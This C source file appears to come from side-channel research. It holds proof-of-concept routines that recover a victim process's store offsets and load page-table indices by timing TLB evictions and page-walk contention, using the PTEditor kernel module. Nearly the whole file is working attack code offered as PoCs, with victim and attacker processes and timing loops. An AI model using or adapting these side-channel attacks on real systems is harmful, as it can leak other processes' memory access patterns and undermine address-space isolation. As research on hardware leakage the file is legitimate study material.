#define _GNU_SOURCE

#include <signal.h>
#include <stdio.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>

#include "utils.h"
#include "ptedit_header.h"

// assuming 4KB page and 4-level PT
#define PAGE_SHIFT (12u)
#define PAGE_SIZE (1u << PAGE_SHIFT)
#define INDEX_WIDTH (9u)
#define INDEX_COUNT (1u << INDEX_WIDTH)
#define INDEX_MASK (INDEX_COUNT - 1)

// allocate PRIVATE memory and initialize it
static u8 *setup_page(void *addr, size_t size, u8 init) {
    u8 *page = mmap(addr, size, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1 /* fd */, 0 /* offset */);
    if (page == MAP_FAILED) {
        return NULL;
    }
    memset(page, init, size);
    return page;
}

// get index for a given pointer and a level of page table
// PGD (level 4) -> PUD (level 3) -> PMD (level 2) -> PTE (level 1)
static u16 get_PL_index(void *ptr, u8 level) {
    u64 page = ((uintptr_t)ptr >> PAGE_SHIFT);
    return (page >> ((level - 1) * INDEX_WIDTH)) & INDEX_MASK;
}
// end of util functions

int contention_effects(bool alias, bool sameline) {
    const u32 store_offset = 0x80;
    const u64 MEASURES = 100;
    // PL1 offset = 0x80 (alias) or 0x90 (not alias but same line) or 0x160
    u64 load_addr = alias ? 0x402010010000ul
                          : (sameline ? 0x402010012000ul : 0x402010020000ul);
    const u32 stlb_way = 16; // for skylake
    u8 *eviction_sets[2][stlb_way];
    u64 step = 0x4000000ul; // step on bit 26, for eviction construction

    // build eviction set
    for (u64 i = 0; i < 2 * stlb_way; i++) {
        u8 *ptr = setup_page((void *)(load_addr + step * i), PAGE_SIZE, 0x0);
        if (!ptr) {
            fprintf(stderr, "Failed to map: %lu\n", i);
            return 1;
        }
        eviction_sets[i / stlb_way][i % stlb_way] = ptr;
    }

    u8 *victim_page = setup_page(NULL, PAGE_SIZE, 0x0);
    if (!victim_page)
        return 2;

    pid_t pid = fork();
    if (pid == 0) {
        usleep(10);
        while (true) {
            _mwrite(&victim_page[store_offset], 0xff);
        }
    } else if (pid < 0) {
        fprintf(stderr, "Cannot fork!\n");
        return 3;
    }

    usleep(100);
    u64 lat = 0;
    for (u32 i = 0; i < MEASURES; i++) {
        u64 t_start, t_diff;
        u32 sig;

        u8 *ptr = eviction_sets[i % 2][0] + 0x800;
        t_start = _rdtscp(&sig);
        _maccess(ptr);
        t_diff = _rdtscp(&sig) - t_start;
        lat += t_diff;

        for (u32 j = 1; j < stlb_way; j++) {
            _maccess(eviction_sets[i % 2][j]);
        }
        printf("%lu\n", t_diff);
    }
    fprintf(stderr, "Avg. Latency: %lu\n", lat / MEASURES);

    for (u64 i = 0; i < 2 * stlb_way; i++) {
        munmap(eviction_sets[i / stlb_way][i % stlb_way], PAGE_SIZE);
    }

    munmap(victim_page, PAGE_SIZE);
    kill(pid, SIGKILL);
    return 0;
}

#define VICTIM_STORE_OFFSET (0x528u)
static int __attribute__((noinline)) store_offset_recovery() {
    int ret = 0;
    const u32 MEASURES = 100;
    pid_t pid = fork();
    if (pid == 0) {
        usleep(10); // a little sleep helps
        u8 *victim_page = setup_page(NULL, PAGE_SIZE, 0);
        if (!victim_page) return 1;
        while (true) {
            // normal_page is NOT shared, the child process will make a copy on
            // write
            _mwrite(&victim_page[VICTIM_STORE_OFFSET], 0xff);
        }
    } else if (pid < 0) {
        fprintf(stderr, "Failed to fork.\n");
        return 2;
    }

    usleep(100);
    u32 factor = 4;
    u64 num_pages = 512 * factor; // > sTLB size on Skylake
    u8 *pages = mmap(NULL, num_pages * PAGE_SIZE, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1 /* fd */, 0 /* offset */);
    // these pages are not initialized on purpose, so that they are mapped
    // to the same physical page. This can help prevent data from being evicted
    // from caches, while still evict translations from TLBs
    if (!pages) {
        ret = 3;
        goto mmap_fail;
    }

    u64 *results = malloc(sizeof(u64) * 512);
    if (!results) {
        goto malloc_fail;
    }
    memset(results, 0, sizeof(u64) * 512);

    for (u64 cnt = 0; cnt < num_pages * MEASURES; cnt++) {
        u64 idx = (cnt * 167 + 13) % num_pages; // "randomize the order"
        u8 *ptr = pages + idx * PAGE_SIZE;
        u32 sig;
        u64 t_start, t_diff;

        t_start = _rdtscp(&sig);
        _maccess(ptr);
        t_diff = _rdtscp(&sig) - t_start;

        u16 pte_offset = ((uintptr_t)ptr & 0x1ff000) >> 12;
        results[pte_offset] += t_diff;
    }

    for (u32 offset = 0; offset < INDEX_COUNT; offset++) {
        printf("%#5x\t%5lu\n", offset << 3, results[offset] / MEASURES / factor);
    }

    free(results);
malloc_fail:
    munmap(pages, num_pages);
mmap_fail:
    kill(pid, SIGKILL);
    return ret;
}

#define VICTIM_LOAD_ADDR (0x439948621000ull)
static int __attribute__((noinline)) load_page_recovery_throughput() {
    int ret;
    const u32 MEASURES = 100, REPEATS = 100000;
    const i32 WARMUP = 10;

    // a page with PL4_index = 0x87, PL3_index = 0x65,
    // PL2_index = 0x43, PL1_index = 0x21
    u8 *page = mmap((void *)VICTIM_LOAD_ADDR /* addr */, PAGE_SIZE,
                    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,
                    -1 /* fd */, 0 /* offset */);
    if (page == MAP_FAILED) {
        return 1;
    }

    fprintf(stderr, "Oracles:\n");
    fprintf(stderr, "\tPL4 index: %#x\n", get_PL_index(page, 4));
    fprintf(stderr, "\tPL3 index: %#x\n", get_PL_index(page, 3));
    fprintf(stderr, "\tPL2 index: %#x\n", get_PL_index(page, 2));
    fprintf(stderr, "\tPL1 index: %#x\n", get_PL_index(page, 1));

    // shared variable controls when to measure throughput in sender
    volatile u8 *start =
        mmap(NULL /* addr */, sizeof(u8), PROT_READ | PROT_WRITE,
             MAP_SHARED | MAP_ANONYMOUS, -1 /* fd */, 0 /* offset */);
    // shared page to store throughput results
    u64 *counts = mmap(NULL /* addr */, PAGE_SIZE, PROT_READ | PROT_WRITE,
                       MAP_SHARED | MAP_ANONYMOUS, -1 /* fd */, 0 /* offset */);
    if (start == MAP_FAILED || counts == MAP_FAILED) {
        return 1;
    }
    *start = 0;
    memset(counts, 0 /* init value */, PAGE_SIZE);

    pid_t pid = fork();
    if (pid == 0) {
        // sender
        i32 idx = -WARMUP;
        usleep(10);

        while (true) {
            u64 cnt = 0;
            while (!*start); /* busy wait */

            // start throughput measurement, we should observe a lower
            // throughput if _maccess(page)'s page walk is stalled a lot
            while (*start) {
                ptedit_invalidate_tlb(page);
                _maccess(page);
                _lfence();
                cnt += 1;
            }
            // save throughput results
            if (idx >= 0)
                counts[idx % (PAGE_SIZE / sizeof(u64))] = cnt;
            idx++;
        }
    } else if (pid < 0) {
        fprintf(stderr, "Failed to fork.\n");
        return 2;
    }

    u8 *victim_page = setup_page(NULL, PAGE_SIZE, 0);
    if (!victim_page) {
        ret = 3;
        goto mmap_fail;
    }
    // receiver
    for (u32 iter = 0; iter < INDEX_COUNT + WARMUP; iter++) {
        u8 *ptr;
        if (iter >= WARMUP) {
            ptr = victim_page + ((iter - WARMUP) << 3); // align to 8-byte
        } else {
            ptr = victim_page;
        }
        usleep(10);
        *start = 1; // start measurement in sender
        _mfence();
        _lfence();
        for (u32 rept = 0; rept < REPEATS; rept++) {
            // attempt to stall page walks in sender
            _mwrite(ptr, 0xff /* value to write */);
        }
        *start = 0; // end measurement
        _mfence();
        _lfence();
    }

    for (u32 disp = 0; disp < INDEX_COUNT; disp++) {
        printf("%#5x\t%lu\n", disp, counts[disp]);
    }

    munmap(victim_page, PAGE_SIZE);
mmap_fail:
    kill(pid, SIGKILL);
    munmap(counts, PAGE_SIZE);
    munmap((u8 *)start, sizeof(u8));
    munmap(page, PAGE_SIZE);
    return ret;
}

static int __attribute__((noinline)) load_page_recovery_contention() {
    int ret;
    const u32 MEASURES = 50, REPEATS = 10000;
    const i32 WARMUP = 10;

    // a page with PL4_index = 0x87, PL3_index = 0x65,
    // PL2_index = 0x43, PL1_index = 0x21
    u8 *page = mmap((void *)VICTIM_LOAD_ADDR /* addr */, PAGE_SIZE,
                    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,
                    -1 /* fd */, 0 /* offset */);
    if (page == MAP_FAILED) {
        return 1;
    }

    fprintf(stderr, "Oracles:\n");
    fprintf(stderr, "\tPL4 index: %#x\n", get_PL_index(page, 4));
    fprintf(stderr, "\tPL3 index: %#x\n", get_PL_index(page, 3));
    fprintf(stderr, "\tPL2 index: %#x\n", get_PL_index(page, 2));
    fprintf(stderr, "\tPL1 index: %#x\n", get_PL_index(page, 1));

    pid_t pid = fork();
    if (pid == 0) {
        usleep(10);
        u32 idx = 0;
        while (true) {
            ptedit_invalidate_tlb(page);
            _maccess(page);
        }
    } else if (pid < 0) {
        fprintf(stderr, "Failed to fork.\n");
        return 2;
    }

    u8 *victim_page = setup_page(NULL, PAGE_SIZE, 0);
    if (!victim_page) {
        ret = 3;
        goto mmap_fail;
    }
    for (u32 iter = 0; iter < INDEX_COUNT + WARMUP; iter++) {
        u32 disp = iter - WARMUP;
        u8 *ptr;
        if (iter >= WARMUP) {
            ptr = victim_page + (disp << 3); // align to 8-byte
        } else {
            ptr = victim_page;
        }
        u32 sig;
        u64 total_time = 0, t_start;
        usleep(10);
        // measure execution latency for MEASURES times
        // we should observe a smaller latency if our store stalls page walk
        // in the sender, since more L1D resources would be available
        for (u32 cnt = 0; cnt < MEASURES; cnt++) {
            t_start = _rdtscp(&sig);
            for (u32 rept = 0; rept < REPEATS; rept++) {
                _mwrite(ptr, 0xff /* value to write */);
            }
            total_time += _rdtscp(&sig) - t_start;
        }
        if (iter > WARMUP)
            printf("%#5x\t%lu\n", disp, total_time / MEASURES);
    }

    munmap(victim_page, PAGE_SIZE);
mmap_fail:
    kill(pid, SIGKILL);
    munmap(page, PAGE_SIZE);
    return ret;
}

#define STORE_OFFSET_POC "store_offset"
#define LOAD_PAGE_TRP_POC "load_page_throughput"
#define LOAD_PAGE_CTT_POC "load_page_contention"

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "Expect one of these arguments:\n"
                        "\t" STORE_OFFSET_POC "\n"
                        "\t" LOAD_PAGE_TRP_POC "\n"
                        "\t" LOAD_PAGE_CTT_POC "\n");
        return 1;
    }

    if (ptedit_init()) {
        fprintf(stderr, "Failed to initialize PTEditor, "
                        "is the kernel module loaded?\n");
        return -1;
    }
    int ret = 0;
    if (strcmp(argv[1], STORE_OFFSET_POC) == 0) {
        ret = store_offset_recovery();
    } else if (strcmp(argv[1], LOAD_PAGE_TRP_POC) == 0) {
        ret = load_page_recovery_throughput();
    } else if (strcmp(argv[1], LOAD_PAGE_CTT_POC) == 0) {
        ret = load_page_recovery_contention();
    } else if (strcmp(argv[1], "contention") == 0) {
        if (argc == 4) {
            ret = contention_effects(atoi(argv[2]), atoi(argv[3]));
        } else {
            fprintf(stderr, "\"contention\" expect two more arguments\n"
                            "\tbino contention <alias?> <same cacheline?>\n"
                            "\tuse 1 for true and 0 for false\n");
        }
    } else {
        fprintf(stderr, "Unknown argument \"%s\"", argv[1]);
        ret = 1;
    }

    ptedit_cleanup();
    return ret;
}
